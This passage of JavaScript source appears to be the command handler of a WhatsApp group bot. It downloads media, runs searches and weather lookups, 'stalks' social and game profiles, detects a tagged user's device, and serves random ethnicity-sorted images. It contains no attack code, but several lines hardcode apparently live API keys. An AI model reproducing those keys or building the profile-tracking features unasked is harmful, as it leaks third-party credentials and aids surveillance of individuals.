        if (!response.data || !response.data.metadata) {
            return replygcprexzy(`❌ Failed to fetch YouTube video. Check your link!`);
        }

        const { metadata, downloads } = response.data;
        const videoUrl = downloads.url;
        const thumbnailUrl = metadata.thumbnail.url;

        await PrexzyVilla.sendMessage(m.chat, {
            image: { url: thumbnailUrl },
            caption: `🎬 *Title:* ${metadata.title}\n📽 *Channel:* ${metadata.author}\n⏱ *Duration:* ${metadata.duration}\n🔗 *Source:* ${text}\n\nDONE BY QUEEN NYX 👑`
        }, { quoted: m });

        await PrexzyVilla.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: `🎥 *Here is your video:*\n\n*Title:* ${metadata.title}\n\nDONE BY QUEEN NYX 👑`
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        replygcprexzy(`❌ Error fetching YouTube MP4. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'git': case 'gitclone':
if (!args[0]) return replygcprexzy(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Prexzybooster`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcprexzy(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    PrexzyVilla.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcprexzy(mess.error))
break
case 'tiktok': case 'tt': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} https://www.tiktok.com/@username/video/123456789`);

    try {
        replygcprexzy('*🔍 Fetching TikTok video...*');

        let videoUrl = text.trim();
        if (!videoUrl.includes("tiktok.com")) {
            return replygcprexzy('*⚠️ Invalid TikTok link! Please enter a valid URL.*');
        }

        let apiUrl = `https://api.tikapi.io/get?url=${encodeURIComponent(videoUrl)}`;

        PrexzyVilla.sendMessage(m.chat, {
            video: { url: apiUrl },
            caption: `✅ *TikTok Video Downloaded!*\n🔗 *Source:* ${videoUrl}\n\nDONE BY QUEEN NYX 👑`
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Failed to download the TikTok video. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'tiktokaudio': case 'ttaudio': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} https://www.tiktok.com/@username/video/123456789`);

    try {
        replygcprexzy('*🔍 Fetching TikTok audio...*');

        let videoUrl = text.trim();
        if (!videoUrl.includes("tiktok.com")) {
            return replygcprexzy('*⚠️ Invalid TikTok link! Please enter a valid URL.*');
        }

        let apiUrl = `https://api.tikapi.io/get?url=${encodeURIComponent(videoUrl)}&type=audio`;

        PrexzyVilla.sendMessage(m.chat, {
            audio: { url: apiUrl },
            mimetype: 'audio/mp4',
            fileName: `tiktok_audio.mp3`,
            caption: `✅ *TikTok Audio Downloaded!*\n🔗 *Source:* ${videoUrl}\n\nDONE BY QUEEN NYX 👑`
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Failed to download the TikTok audio. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'google': case 'search': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} What is AI?`);

    try {
        replygcprexzy('*🔍 Searching DuckDuckGo...*');

        const searchUrl = `https://api.duckduckgo.com/?q=${encodeURIComponent(text)}&format=json`;
        const response = await fetch(searchUrl);
        const data = await response.json();

        if (!data || !data.RelatedTopics || data.RelatedTopics.length === 0) {
            throw '*⚠️ No search results found!*';
        }

        let results = `🔎 *Search Results for:* ${text}\n\n`;
        data.RelatedTopics.slice(0, 3).forEach((item, index) => {
            if (item.Text && item.FirstURL) {
                results += `*${index + 1}. ${item.Text}*\n🔗 ${item.FirstURL}\n\n`;
            }
        });

        results += 'DONE BY QUEEN NYX 👑';
        replygcprexzy(results);

    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Search failed. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'weather':{
if (!text) return replygcprexzy('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           PrexzyVilla.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'fb':
case 'fbdl':
case 'facebook':
case 'facebookvid': {
    if (!text) return replygcprexzy(`📌 *Please provide a Facebook video link.*\n\nExample:\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/`);

    try {
        replygcprexzy('🕒 *Fetching Facebook video...*');

        const data = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(text)}`);

        if (!data || !data.result || !data.result.Normal_video) {
            return replygcprexzy(`❌ *Failed to fetch Facebook video. Check your link!*`);
        }

        const videoUrl = data.result.Normal_video;
        const caption = `📌 *Facebook Video Downloaded!*\n\n✅ *DONE BY QUEEN NYX 👑*`;

        await PrexzyVilla.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: caption
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy('❌ *Error fetching Facebook video. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'tiktokstalk':
case 'ttstalk': {
    if (!text) return replygcprexzy(`📌 *Enter a TikTok Username*\n\nExample: ${prefix + command} i_am_preciousayomide`);

    try {
        replygcprexzy('🕒 *Fetching TikTok profile details...*');

        const respon = await fetchJson(`https://skizo.tech/api/ttstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`);

        if (!respon || !respon.data || !respon.data.user) {
            return replygcprexzy(`❌ No TikTok profile found for *${text}*`);
        }

        const data = respon.data.user;
        const stats = respon.data.stats;

        let profileDetails = `📌 *TIKTOK PROFILE STALK*\n\n`;
        profileDetails += `👤 *Name:* ${data.nickname}\n`;
        profileDetails += `🔖 *Username:* ${data.uniqueId}\n`;
        profileDetails += `👥 *Followers:* ${stats.followerCount}\n`;
        profileDetails += `🫂 *Following:* ${stats.followingCount}\n`;
        profileDetails += `📌 *Bio:* ${data.signature}\n`;
        profileDetails += `🎥 *Videos:* ${stats.videoCount}\n`;
        profileDetails += `❤️ *Total Likes:* ${stats.heart}\n`;
        profileDetails += `🔗 *Profile Link:* [Visit Profile](https://tiktok.com/@${data.uniqueId})\n\n`;
        profileDetails += `DONE BY QUEEN NYX 👑`;

        await PrexzyVilla.sendMessage(m.chat, {
            image: { url: data.avatarLarger },
            caption: profileDetails
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ *Error fetching TikTok profile. Please try again later.*\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'igstalk': case 'igprofile': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} instagram_username`);

    try {
        replygcprexzy('*🔍 Fetching Instagram profile details...*');

        let username = text.trim();
        let apiUrl = `https://igx-reverse-proxy.vercel.app/api/user/${username}`;

        const response = await fetch(apiUrl);
        const data = await response.json();

        if (!data || !data.username) {
            throw '*⚠️ No user found with this username!*';
        }

        let userInfo = `🔍 *Instagram Profile Stalk*\n\n`;
        userInfo += `👤 *Username:* ${data.username}\n`;
        userInfo += `📛 *Full Name:* ${data.full_name}\n`;
        userInfo += `📷 *Profile Picture:* ${data.profile_pic_url}\n`;
        userInfo += `📌 *Bio:* ${data.biography || 'No Bio'}\n`;
        userInfo += `👥 *Followers:* ${data.follower_count}\n`;
        userInfo += `👤 *Following:* ${data.following_count}\n`;
        userInfo += `🔗 *Profile Link:* https://www.instagram.com/${data.username}\n\n`;
        userInfo += `DONE BY QUEEN NYX 👑`;

        PrexzyVilla.sendMessage(m.chat, {
            image: { url: data.profile_pic_url },
            caption: userInfo
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Failed to fetch Instagram profile. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcprexzy(`Example ${prefix+command} Prexzybooster`)
await PrexzyStickWait()
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
PrexzyVilla.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return replygcprexzy(`Example ${prefix+command} prexzyapi`)
await PrexzyStickWait()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
replygcprexzy(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk': case 'freefirestalk': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} 123456789`);

    try {
        replygcprexzy('*🔍 Fetching Free Fire profile details...*');

        let uid = text.trim();
        let apiUrl = `https://api.ff.garena.com/player/stats?uid=${uid}`;

        const response = await fetch(apiUrl);
        const data = await response.json();

        if (!data || !data.nickname) {
            throw '*⚠️ No user found with this Free Fire ID!*';
        }

        let userInfo = `🔍 *Free Fire Profile Stalk*\n\n`;
        userInfo += `🆔 *ID:* ${uid}\n`;
        userInfo += `👤 *Nickname:* ${data.nickname}\n`;
        userInfo += `🎮 *Level:* ${data.level}\n`;
        userInfo += `🏆 *Rank:* ${data.rank}\n`;
        userInfo += `🔥 *Battle Style:* ${data.battle_style || 'Not Available'}\n`;
        userInfo += `🔗 *Profile Link:* https://freefire.garena.com/\n\n`;
        userInfo += `DONE BY QUEEN NYX 👑`;

        PrexzyVilla.sendMessage(m.chat, {
            text: userInfo
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Failed to fetch Free Fire profile. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'mlstalk': {
if (!q) return replygcprexzy(`Example ${prefix+command} 530793138|8129`)
await PrexzyStickWait()
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcprexzy(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'device': {
    if (!m.mentionedJid[0]) return replygcprexzy("❌ Please tag someone to check their device.");

    let targetUser = m.mentionedJid[0];
    let deviceType = getDevice(targetUser);

    if (!deviceType) return replygcprexzy("⚠️ Unable to detect device for this user.");

    let msg = `📲 *Device Detection*\n\n👤 *User:* @${targetUser.split('@')[0]}\n📱 *Device:* ${deviceType}\n\nDONE BY QUEEN NYX 👑`;
    
    PrexzyVilla.sendMessage(m.chat, { text: msg, mentions: [targetUser] }, { quoted: m });
}
break

// ini untuk fitur yg ada button nya
case '1':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '2':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '4':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '5':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '6':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '7':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '8':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '9':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '10':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '11':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '12':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '13':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '14':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '15':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '16':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '17':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '18':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '19':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '20':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '21':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '22':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '23':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '24':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '25':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '26':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '27':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '28':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '29':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '30':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '31':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '32':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '33':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '34':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '35':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '36':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '37':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '38':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '39':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '40':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '41':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '42':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '43':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '44':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '45':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case '46':{
replygcprexzy('[ *Coming soon* ] `Fitur ini belum ada karena ini fitur Belum tersedia Untuk saat ini Tunggu rilis Version Selanjutnya Versi Full realise Belum di tentukan`')
}
break
case 'spotify':{
	if (!text) return replygcprexzy(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return replygcprexzy('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return replygcprexzy('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return replygcprexzy( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "Prexzy",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await PrexzyVilla.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return replygcprexzy('*Error*')
    }
    }
    break
case 'prexzyai':
case 'ayoai':
case 'preciousai': {
    if (!q) return replygcprexzy(`📌 *Example Usage:*\n${prefix + command} What is the capital of Nigeria?`);

    try {
        replygcprexzy('🤖 *Processing your request...*');

        let response = await PrexzyChat(q);

        replygcprexzy(`💬 *AI Response:*\n\n${response}\n\nDONE BY QUEEN NYX 👑`);

    } catch (error) {
        console.error(error);
        replygcprexzy('❌ *AI is currently unavailable. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'imdb':
if (!text) return replygcprexzy(`_Name a Series or movie`)
await PrexzyStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           PrexzyVilla.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinary': {
if (!q) return replygcprexzy(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcprexzy(eb)
}
break
case 'dbinary': {
if (!q) return replygcprexzy(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcprexzy(db)
}
break
case 'gdrive': {
		if (!args[0]) return replygcprexzy(`Enter the Google Drive link`)
	await PrexzyStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcprexzy(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	PrexzyVilla.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcprexzy('Error: Check link or try another link') 
  }
}
break
case 'pinterest': {
if (!text) return replygcprexzy(`Enter Query`)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
PrexzyVilla.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return replygcprexzy(`Example : ${prefix + command} black rover`)
        let ringtone = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		PrexzyVilla.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tiktokgirl':
await PrexzyStickWait()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await PrexzyStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await PrexzyStickWait()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await PrexzyStickWait()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await PrexzyStickWait()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await PrexzyStickWait()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await PrexzyStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await PrexzyStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
